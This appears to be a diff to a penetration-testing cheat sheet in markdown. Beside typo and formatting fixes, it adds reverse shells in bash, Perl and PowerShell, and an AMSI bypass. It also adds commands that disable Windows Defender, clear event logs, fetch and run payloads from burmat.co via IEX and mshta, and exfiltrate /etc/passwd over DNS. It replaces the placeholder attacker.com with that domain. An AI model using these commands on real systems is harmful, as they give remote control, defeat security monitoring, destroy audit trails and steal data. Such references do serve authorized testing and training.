@@ -45,7 +45,7 @@ PS C:\> net use Q: /delete
 perl -e 'use File::Fetch; my $ff=File::Fetch->new(uri => "http://10.10.10.11/exploit.sh"); my $file = $ff->fetch() or die $ff->error;'
 ```
 ### Nginx + PUT Request
-[Picked up from here](https://www.youtube.com/watch?v=ob9SgtFm6\_g) (thanks @ippsec), you can start a nginx server that can accept PUT requests for file transfer via HTTP:
+[Picked up from here](https://www.youtube.com/watch?v=ob9SgtFm6_g) (thanks @ippsec), you can start a nginx server that can accept PUT requests for file transfer via HTTP:
 ```shell
 cat /etc/nginx/sites-enabled/file_upload
 #server {
@@ -64,7 +64,7 @@ cURL:
 curl -X PUT http://192.168.1.87:8001/l00t.txt -F "data=@/home/user/l00t.txt"
 ```
 PowerShell:
-```bash
+```powershell
 Invoke-RestMethod -Method PUT -Uri "http://10.10.14.12:8001/l00t.txt" -Body $(Get-Content l00t.txt)
 ```
 ### Netcat File Transfer
@@ -87,7 +87,7 @@ regsvr32 /s /u C:\temp\payload.dll
 (_Source:_ [_http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html_](http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html) )
 ### HTTP GET Request via Bash
 ```sh
-export RHOST=attacker.com
+export RHOST=burmat.co
 export RPORT=12345
 export LFILE=file_to_get
 bash -c '{ echo -ne "GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n" 1>&3; cat 0<&3; } \
@@ -97,7 +97,7 @@ bash -c '{ echo -ne "GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n" 1>&3; cat 0<&
 ### RAW TCP Connection
 Fetch remote file using a TCP connection. Run `nc -l -p 12345 < "file_to_send"` on the attacker box to send the file.
 ```sh
-export RHOST=attacker.com
+export RHOST=burmat.co
 export RPORT=12345
 export LFILE=file_to_get
 bash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'
@@ -148,6 +148,9 @@ base64 <<< $(cat shell.py) | tr -d "\n"
 echo -n "ZmlsZSBjb250ZW50IGhlcmUK" | base64 -d > shell.py
 ```
 ## Shells / Reverse Shells
+
+Collection of reverse shell payloads for various languages and platforms.
+
 ### PHP Reverse Shell - Minified
 ```php
 <?php set_time_limit (0); $VERSION = "1.0"; $ip = "10.10.10.10"; $port = 8080; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = "uname -a; w; id; /bin/bash -i"; $daemon = 0; $debug = 0; if (function_exists("pcntl_fork")) { $pid = pcntl_fork(); if ($pid == -1) { exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { exit(1); } $daemon = 1; } chdir("/"); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { exit(1); } $descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w")); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); while (1) { if (feof($sock)) { break; } if (feof($pipes[1])) { break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { $input = fread($sock, $chunk_size); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { $input = fread($pipes[1], $chunk_size); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { $input = fread($pipes[2], $chunk_size); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); ?>
@@ -209,7 +212,28 @@ conn.shell(:powershell) do |shell|
 end
 ```
 _(originally sourced from:_ [_https://github.com/WinRb/WinRM_](https://github.com/WinRb/WinRM)_)_
+
+### Bash Reverse Shell (One-Liner)
+```bash
+0<&196;exec 196<>/dev/tcp/10.10.10.10/4444; sh <&196 >&196 2>&196
+```
+
+### Perl Reverse Shell
+
+```perl
+perl -e 'use Socket;$i="10.10.10.10";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
+
+### PowerShell One-Liner Reverse Shell
+
+```powershell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
 ## Enumeration
+
+Various scripts and one-liners for system enumeration and reconnaissance.
+
 ### Finding Vulnerable Applications (Linux)
 This one is pretty dirty, and pretty awesome. Run a one-liner on your victim to generate a list of packages (`rpm` **or** `dpkg`) on the machine (`/tmp/packages.txt`). Copy this file to one that has `searchsploit`, and run the script.
 Generate the file with:  
@@ -253,7 +277,7 @@ for ip in $(cat ~/Documents/labs/targets.txt  | awk '/^[0-9]/ {print $1}'); do
 	echo "Performing snmpwalk on public tree for" $ip " - Checking for Software Name"	
 	snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.6.3.1.2 > ~/Documents/labs/$ip/scans/softwarename.txt
 
-	echo "Performing snmpwalk on public tree for" $ip " - Checking for User Accouints"	
+	echo "Performing snmpwalk on public tree for" $ip " - Checking for User Accounts"	
 	snmpwalk -c public -v1 $ip 1.3.6.1.4.1.77.1.2.25 > ~/Documents/labs/$ip/scans/useraccounts.txt
 
 	echo "Performing snmpwalk on public tree for" $ip " - Checking for TCP Local Ports"	
@@ -315,15 +339,77 @@ Not the fastest or the cleanest, but it's an easy way to generate a ping scan fr
 ```vb
 FOR /L %i IN (1,1,254) DO ping -n 1 192.168.1.%i | FIND /i "Reply" >> ips.txt
 ```
-## REMOTE DESKTOP (ENABLE / ADD)
+## Remote Desktop (Enable/Add)
+
 ### Enable RDP
+
 ```powershell
 Set-itemproperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\' -Name "fDenyTSConnections" -value 0
 Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\' -Name "UserAuthentication" -value 1
 Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
 ```
+
 If you need to add your user to the group, you can use: `NET LOCALGROUP "Remote Desktop Users" domain\user /ADD`. And if you need to disable the firewall altogether: `NetSh Advfirewall set allprofiles state off`
-## SYSTEM CLEANUP
+
+## Defense Evasion
+
+### AMSI Bypass (PowerShell)
+
+Disable AMSI in current PowerShell session:
+
+```powershell
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+```
+
+### Disable Windows Defender
+
+```powershell
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableIOAVProtection $true
+Set-MpPreference -DisableBehaviorMonitoring $true
+```
+
+### Download and Execute in Memory
+
+Avoid writing to disk entirely:
+
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('http://burmat.co/payload.ps1')
+```
+
+### Clear Windows Event Logs
+
+```powershell
+wevtutil el | Foreach-Object {wevtutil cl "$_"}
+```
+
+### LOLBin - Download with mshta
+
+```cmd
+mshta vbscript:Close(Execute("GetObject(""script:http://burmat.co/payload.sct"")"))
+```
+
+### LOLBin - Bypass AppLocker with InstallUtil
+
+```powershell
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
+```
+
+## Data Exfiltration
+
+### DNS Exfiltration
+
+Exfiltrate data through DNS queries (useful when HTTP/HTTPS is blocked):
+
+```bash
+# Hex encode and exfil via DNS
+cat /etc/passwd | xxd -p | fold -w32 | while read line; do dig $line.burmat.co; done
+
+# Base64 encode and exfil
+cat sensitive.txt | base64 -w0 | fold -w32 | while read line; do nslookup $line.burmat.co; done
+```
+
+## System Cleanup
 ### Purge Linux Logs
 ```bash
 #!/bin/sh
